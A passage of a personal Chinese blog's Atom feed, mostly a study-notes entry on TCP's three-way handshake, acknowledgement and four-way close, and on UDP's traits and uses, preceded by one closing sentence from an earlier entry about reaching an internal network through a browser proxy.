&lt;p&gt;点击应用即可，再在浏览器右上角将代理切换至刚才配置好的自己设置的名称，就会发现自己的 ip 已经切换至目标机子的服务器，就能够正常访问内网了&lt;/p&gt;
</content>
        <category term="其它" />
        <updated>2024-04-16T05:58:19.053Z</updated>
    </entry>
    <entry>
        <id>https://nnnpc.github.io/2024/04/16/%E5%85%B3%E4%BA%8ETCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/</id>
        <title>关于TCP与UDP协议的学习</title>
        <link rel="alternate" href="https://nnnpc.github.io/2024/04/16/%E5%85%B3%E4%BA%8ETCP%E4%B8%8EUDP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
        <content type="html">&lt;p&gt;TCP 协议的三次握手，传输确认，四次挥手&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;一tcp三次握手&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一tcp三次握手&#34;&gt;#&lt;/a&gt; 一.TCP 三次握手&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/mcwMZ9QmuxvnWDoH.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;刚开始由客户端 1 发送给服务端 2&lt;br&gt;
SYN 包，询问服务端是否能与其建立练接。服务端同意后回了&lt;br&gt;
 SYN+ACK 包给客户端 3，客户端 3 再回 ACK 包给服务端 4，三次握手建立，连接成功。&lt;/p&gt;
&lt;h2 id=&#34;二传输确认&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二传输确认&#34;&gt;#&lt;/a&gt; 二。传输确认&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;个人理解认为，传输确认这一步骤很大原因是为了防止丢包，保证TCP协议的稳定可靠性。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;发送缓冲区：0 1 2 3 4 5 6 7 8 9 10 11 12&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;发送报文：序列号 + 长度 + 发送缓冲区中的数据内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;回复确认：ACK = 序列号 + 长度 = 下一包的起始序列号&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;由三次握手可以确认客户端与服务端传输的是同一次的包，防止丢包现象的发生，同时也因为拥有数据内容，客户端也可以传输数据片段给服务端，服务端再根据数据片段重新拼装成完整的数据内容。（同时这也可以让服务端确认缺失了哪一段数据，要求客户端重新发送）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;三四次挥手&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#三四次挥手&#34;&gt;#&lt;/a&gt; 三。四次挥手&lt;/h2&gt;
&lt;p&gt;ps：客户端与服务端都可以发起关闭请求&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QaD478U79fT9rvRF.png!thumbnail&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;四次挥手流程：&lt;/p&gt;
&lt;p&gt;1-&amp;gt;2：客户端向服务端发送了 FIN 包然后进入了 3（终止等待 1 状态）&lt;/p&gt;
&lt;p&gt;2-&amp;gt;3：服务端回了 ACK 包给 3 后进入了 4（关闭等待状态），而 3 收到了 ACK 包以后进入了 5（终止等待 2 状态）&lt;/p&gt;
&lt;p&gt;（此时服务端还能发送数据，客户端还能接收数据，待数据传输完成后开始下一步。）&lt;/p&gt;
&lt;p&gt;4-&amp;gt;5：确认传输完成后 4 会向 5 发送 FIN 包，然后进入 6（最后的确认状态）&lt;/p&gt;
&lt;p&gt;5-&amp;gt;6：5 收到来自 4 的 FIN 包以后会向 6 发送 ACK 包，然后进入超时等待状态&lt;/p&gt;
&lt;p&gt;6-&amp;gt;8：当 6 收到来自 5 的 ACK 包后会立马进入 8（也就是立马关闭）&lt;/p&gt;
&lt;p&gt;7-&amp;gt;9：经过超时时间后会自动关闭也就是 7-&amp;gt;9&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ps：为什么要有超时等待状态：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;（一句话概括就是为了确保服务端关闭）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;详：是为了确认服务端收到 ACK 包（如不等待且服务端没有收到 ACK 包，那么服务端就会停留在最后的确认状态）。等待时，如服务端未收到 ACK 包，那么就会重复 4-&amp;gt;5，服务端重新发送 FIN 包，而客户端收到后也就会重新发送 ACK 包（超时等待时间也会被重新刷新）。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;udp协议非连接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#udp协议非连接&#34;&gt;#&lt;/a&gt; UDP 协议（非连接）&lt;/h2&gt;
&lt;p&gt;简单封装数据包并从网卡发出，数据包间无状态上的联系&lt;/p&gt;
&lt;p&gt;因此推出 UDP 的特征：1. 性能损耗少 2. 资源占用少 3. 稳定性弱&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;TCP 与 UDP 差异：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.TCP 面向连接，UDP 面向报文&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.TCP 对系统资源要求较多，UDP 结构相对简单&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.TCP 稳定可靠，UDP 传输数据快&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;TCP 用于传输文件，发送邮件，浏览网页等&lt;/p&gt;
&lt;p&gt;（用于对传输质量要求较高的地方）&lt;/p&gt;
&lt;p&gt;UDP 用于域名查询，语音通话，视频直播等&lt;/p&gt;
&lt;p&gt;还可以用于隧道网络：VPN，VXLAN&lt;/p&gt;
&lt;p&gt;（用于对速度要求高，但是对少量丢包没有太大要求的场景）&lt;/p&gt;
</content>
        <category term="其它" />
        <updated>2024-04-16T05:58:19.049Z</updated>
    </entry>
</feed>
